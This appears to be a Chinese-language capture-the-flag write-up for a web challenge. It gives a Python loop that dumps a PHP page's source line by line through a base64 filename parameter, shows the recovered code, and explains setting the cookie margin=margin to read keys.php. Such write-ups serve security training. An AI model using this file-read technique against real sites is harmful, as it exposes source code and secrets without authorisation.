编写脚本访问得到源码

```python
import requests

a = 30

for i in range(a):
    url = "http://120.24.86.145:8002/index.php?line=" + str(i) + "&filename=aW5kZXgucGhw" 
    s = requests.get(url)
    print(s.text)
```

```php
<?php
 
error_reporting(0);
 
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
 
$line=isset($_GET['line'])?intval($_GET['line']):0;
 
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
 
$file_list = array(
 
'0' =>'keys.txt',
 
'1' =>'index.php',
 
);
 
 
 
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){       //看这里
 
$file_list[2]='keys.php';
 
}
 
 
 
if(in_array($file, $file_list)){
 
$fa = file($file);
 
echo $fa[$line];
 
}
 
?>
```

关键代码检查有没有设置 Cookie margin，同时判断其值是否为 margin，最后才能访问 keys.php 文件

打开 BurpSuite 抓包拦截设置 Cookie，同时不要忘了编码 keys.php，以及删除 line 参数值
